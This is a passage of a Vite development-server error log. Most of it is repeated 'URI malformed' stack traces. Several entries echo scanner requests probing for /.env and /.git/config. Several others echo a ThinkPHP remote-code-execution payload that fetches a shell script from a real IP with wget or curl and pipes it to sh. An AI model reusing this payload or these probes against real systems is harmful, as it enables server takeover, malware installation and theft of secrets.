      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
10:39:51 AM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
3:55:30 PM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
11:04:45 PM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
11:36:18 PM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
10:21:00 AM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
Files in the public directory are served at the root path.
Instead of /public/.env, use /.env.
11:53:40 PM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
2:12:20 AM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
10:32:11 AM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
10:36:18 PM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
3:50:27 AM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
Files in the public directory are served at the root path.
Instead of /public/.env, use /.env.
Files in the public directory are served at the root path.
Instead of /public/js/main.js, use /js/main.js.
Files in the public directory are served at the root path.
Instead of /public/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=(wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||busybox wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||curl -s http%3A%2F%2F74.194.191.52%2Frondo.txg.sh)|sh, use /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=(wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||busybox wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||curl -s http%3A%2F%2F74.194.191.52%2Frondo.txg.sh)|sh.
9:04:31 AM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
Files in the public directory are served at the root path.
Instead of /public/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=(wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||busybox wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||curl -s http%3A%2F%2F74.194.191.52%2Frondo.txg.sh)|sh, use /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=(wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||busybox wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||curl -s http%3A%2F%2F74.194.191.52%2Frondo.txg.sh)|sh.
2:06:46 PM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
Files in the public directory are served at the root path.
Instead of /public/.git/config, use /.git/config.
Files in the public directory are served at the root path.
Instead of /public/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=(wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||busybox wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||curl -s http%3A%2F%2F74.194.191.52%2Frondo.txg.sh)|sh, use /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=(wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||busybox wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||curl -s http%3A%2F%2F74.194.191.52%2Frondo.txg.sh)|sh.
6:14:53 PM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
9:03:51 PM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
9:50:48 PM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
Files in the public directory are served at the root path.
Instead of /public/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=(wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||busybox wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||curl -s http%3A%2F%2F74.194.191.52%2Frondo.txg.sh)|sh, use /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=(wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||busybox wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||curl -s http%3A%2F%2F74.194.191.52%2Frondo.txg.sh)|sh.
11:25:34 PM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
Files in the public directory are served at the root path.
Instead of /public/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=(wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||busybox wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||curl -s http%3A%2F%2F74.194.191.52%2Frondo.txg.sh)|sh, use /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=(wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||busybox wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||curl -s http%3A%2F%2F74.194.191.52%2Frondo.txg.sh)|sh.
2:32:18 AM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
Files in the public directory are served at the root path.
Instead of /public/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=(wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||busybox wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||curl -s http%3A%2F%2F74.194.191.52%2Frondo.txg.sh)|sh, use /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=(wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||busybox wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||curl -s http%3A%2F%2F74.194.191.52%2Frondo.txg.sh)|sh.
4:53:02 AM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
Server responded with status code 431. See https://vite.dev/guide/troubleshooting.html#_431-request-header-fields-too-large.
9:44:20 AM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
Files in the public directory are served at the root path.
Instead of /public/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=(wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||busybox wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||curl -s http%3A%2F%2F74.194.191.52%2Frondo.txg.sh)|sh, use /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=(wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||busybox wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||curl -s http%3A%2F%2F74.194.191.52%2Frondo.txg.sh)|sh.
10:28:26 AM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
